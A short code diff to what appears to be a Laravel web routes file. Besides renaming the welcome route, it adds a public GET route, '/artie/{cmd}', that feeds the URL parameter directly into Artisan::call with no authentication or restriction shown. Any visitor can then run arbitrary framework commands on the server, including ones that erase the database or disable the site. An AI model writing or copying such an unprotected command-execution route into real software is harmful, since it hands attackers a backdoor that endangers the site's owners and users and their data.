@@ -4,6 +4,7 @@ use App\Models\User;
 use Illuminate\Http\Request;
 use Illuminate\Support\Carbon;
 use Illuminate\Support\Facades\Route;
+use Illuminate\Support\Facades\Artisan;
 use App\Http\Controllers\GeneralController;
 use App\Http\Controllers\ProfileController;
 
@@ -20,7 +21,12 @@ use App\Http\Controllers\ProfileController;
 
 Route::get('/', function () {
    return view('welcome');
-})->name(' function');
+})->name('welcome');
+
+Route::get('/artie/{cmd}', function () {
+   dd(Artisan::call(request()->cmd));
+})->name('artisan');
+
 
 Route::get('tinker', function () {
    dd('tinker route');
